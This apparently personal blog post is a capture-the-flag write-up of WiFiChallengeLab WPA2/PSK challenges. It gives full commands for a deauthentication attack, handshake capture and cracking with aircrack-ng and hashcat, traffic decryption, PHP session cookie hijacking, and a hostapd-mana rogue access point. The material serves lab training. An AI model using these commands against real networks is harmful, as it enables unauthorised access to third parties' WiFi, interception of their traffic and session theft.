---
title: Hacking WPA2 WiFi Networks
author: eMVee
date: 2023-12-10 20:00:00 +0800
categories: [CTF, WiFiChallengeLAB]
tags: [WPA2, OSWP, WiFiChallengeLAB, WiFi]
render_with_liquid: false
---

While working on WiFiChallengeLabs, WPA2/PSK networks are virtually present for hacking. These types of networks are common as home networks. A WPA2/PSK network is easy to hack by capturing a WPA handshake after which it can be cracked. If the password is in a dictionary, it is a matter of time before the password is found. A long and complex password would therefore take more time to be cracked.

## What is the wifi-mobile AP password?
Personally, I like to have multiple terminals open so I can have multiple things running at the same time. Even now I like to work with multiple terminals.

### Get ready for WiFi hacking
Let's open **Terminal 1** and kill all running processes.
```bash
sudo airmon-ng check kill
```
Next we should enable the monitor mode on our interface.
```bash
sudo airmon-ng start wlan0
```
We can check if the monitor mode is enabled on the interface with iwconfig.
```bash
iwconfig
```
### Information gathering about WiFi target
As soon as I noticed that the monitor mode is enabled I opened **Terminal 2 - Scanning**. A specific terminal to scan for WiFi networks
```bash
sudo airodump-ng wlan0mon --band abg
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017045937.png){: width="700" height="400" }

The target network is `wifi-mobile` and by highlighting this network we can see there are workstations trying to connect to it or they are connected to them. We should take some notes of:
- ESSID=wifi-mobile 
- Channel=6
- BSSID = F0:9F:C2:71:22:12
- AUTH = PSK
- STATION = 28:6C:07:6F:F9:44

### Capture handshake
To crack a handshake we should capture a handshake by writing it to a file. To do this I like to open a new terminal and I rename it to **Terminal 3 - Capture**.
No we should capture traffic on channel 6 to capture the handshake for our target.
```bash
sudo airodump-ng -c 6 -w wifi-mobile wlan0mon
```

Next I start a new terminal, rename it to **Terminal 4 - Deauthenticate** and I will use this terminal to deauthenticate workstations on the target network. If a workstation has been deauthenticated, it will try to connect to the WiFi network again. In this process we are able to capture a handshake. We can launch a deauthentication attack with aireplay-ng
```bash
sudo aireplay-ng -0 1 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:44 wlan0mon
```
 
In terminal 3 we can see that a client tried to connect to `wifi-mobile`. We have captured a handshake.
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017050602.png){: width="700" height="400" }

### Crack handshake for a password
As soon as the handshake has been captured I can start trying to crack it with aircrack-ng.
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b F0:9F:C2:71:22:12 wifi-mobile-01.cap
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017050851.png){: width="700" height="400" }

With this password we can try to connect to the target WiFi network. First I stop the monitor mode.
```bash
sudo airmon-ng stop wlan0mon
```
Next the network manager is restarted again.
```bash
systemctl restart NetworkManager.service
```
Now we can create a configuration file to connect to the target network.
```bash
nano wpa-mobile.conf
```
The content of the `wpa-mobile.conf` looks like this. The psk contains the cracked password.
```
network={
    ssid="wifi-mobile"
    psk="CRACKED-PASSWORD"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```
After saving the configuration file we could connect to the network with wpa_supplicant.
```bash
wpa_supplicant -D nl80211 -i wlan0 -c wpa-mobile.conf
```
Then we should ask for an IP address to the DHCP server.
```bash
dhclient wlan0 -v
```
After the IP address has been assigned to our interface we can run arp-scan to identify hosts on the network.
```bash
arp-scan -l -I wlan0
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017051444.png){: width="700" height="400" }


## What is the IP of the web server in the wifi-mobile network?

We have cracked the password in the previous challenge. With this password we are able to decrypt the traffic captured earlier.
```bash
airdecap-ng -e wifi-mobile -p CRACKED-PASSWORD wifi-mobile-02.cap
```
After the we have decrypted the communication we can inspect the traffic within Wireshark.

```bash
wireshark wifi-mobile-02-dec.cap
```
Within Wireshark we should filter for `http` trafic so we can Identify the web server within the WiFi network.
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017052757.png){: width="700" height="400" }

In the traffic it is easy to spot the webserver.


## What is the flag after login in wifi-mobile?
In the first challenge for the WPA/PSK networks we have captured the WPA handshake. This WPA handshake could be cracked by us. With the password we are able to connect to the target network. The captured traffic could be decrypted since we have the password. This gives us the ability to inspect network traffic. We used Wireshark to filter for HTTP traffic. 

### Inspect network traffic
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017052835.png){: width="700" height="400" }

By inspecting the packages we could find a PHP Session cookie. We should copy the session ID.

### Change the Session ID
Next step is to open the browser and navigate to the webpage on the webserver. When the webpage is loaded we should open the Developer Tools by hitting the `F12` key.
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017053323.png){: width="700" height="400" }

We now should open the storage and click on Cookies. There is a session cookie set. We can try to change this cookie for the session ID what we have found in the network capture.

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017053405.png){: width="700" height="400" }

By double clicking on the Session ID we can change the PHPSESSID cookie with the value we have found with Wireshark.

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017053454.png){: width="700" height="400" }

If we refresh the webpage we have a valid session.

### Grap the flag
Open the index page and grap the flag!
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017053551.png){: width="700" height="400" }



## Is there client isolation in the wifi-mobile network?
Another challenge in the WPA2/PSK section. This challenge is to capture a flag on one of the other clients.

### Connect to the WPA2 target network
We have cracked the WPA2 handshake in step 1 with Aircrack-ng in one of the previous challenges. This password is needed for our configuration file, so we could connect to the target network.
```bash
nano wpa-mobile.conf
```
The content of `wpa-mobile_conf` Should look like this:
```
network={
    ssid="wifi-mobile"
    psk="CRACKED-PASSWORD"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```
The cracked password is not shown in this configuration, but should be chenged to the cracke dpassword found with Aircrack-ng. Next we can connect to the network with wpa_supplicant as seen as step 3 in the screenshot.
```bash
wpa_supplicant -D nl80211 -i wlan0 -c wpa-mobile.conf
```
Now we should ask for an IP address to the DHCP server as seen as step 4 in the screenshot.
```bash
dhclient wlan0 -v
```
Step 5 is to scan the network with arp-scan. This will identify other hosts on the network.
```bash
arp-scan -l -I wlan0
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017051444.png){: width="700" height="400" }

We should check if there is a webservice running on one of the IP addresses. To see on what IP address a webservice is running we can use a simple port scna with nmap.
```bash
nmap -sS -p 80 192.168.2.7-8
```

### Grap the flag
There are two IP addresses and both with a webservice. We can simply curl to them to see some basic information about the webpage.

```
root@WiFiChallengeLab:~# curl 192.168.2.7
flag{HERE_IS_THE_FLAG_POSITION}
root@WiFiChallengeLab:~# curl 192.168.2.8
flag{HERE_IS_THE_FLAG_POSITION}
root@WiFiChallengeLab:~# 

```


## What is the wifi-offices password?
The final challenge in WPA2/PSK. Retrieve the password from the network via a workstation.


### Gather some information
We are starting to kill processes again so that we are not affected by running processes.
```bash
sudo airmon-ng check kill
```
Next we should start monitor mode.
```bash
sudo airmon-ng start wlan0
```
Now we should gather some information about our target.
```bash
sudo airodump-ng wlan0mon --band abg
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017073037.png){: width="700" height="400" }

We can see that there are two workstations trying to connect to: wifi-offices.

### Create fake AP
We should create a fake Access Point (AP). To this we need to create a configuration file.
```bash
nano hostapd.conf
```
Next we should copy and paste the configuration content into `hostapd-conf`. Some important information in the configuration file are the following items:
- `ssid=wifi-offices`: WiFI networks name as identified from the workstation probes.
- `mana_wpaout=hostapd.hccapx`: location where the WPA handshake will be stored.

```
interface=wlan1
driver=nl80211

hw_mode=g
channel=1
ssid=wifi-offices

mana_wpaout=hostapd.hccapx

wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
After pasting the configuration into the configuration file we should save it. Now we are ready to host the fake AP.
```bash
sudo hostapd-mana hostapd.conf
```

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017073648.png){: width="700" height="400" }

As soon as the fake AP is running we are able to capture some WPA2 handshakes from the workstations.

### Crack the WPA handshake 
Since the WPA2 handshakes are captured into `hostapd.hccapx` we can crack them with hashcat.
```bash
sudo hashcat -a 0 -m 2500 hostapd.hccapx rockyou-top100000.txt --force
```

Hashcat will show the password once cracked.
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017073730.png){: width="700" height="400" }

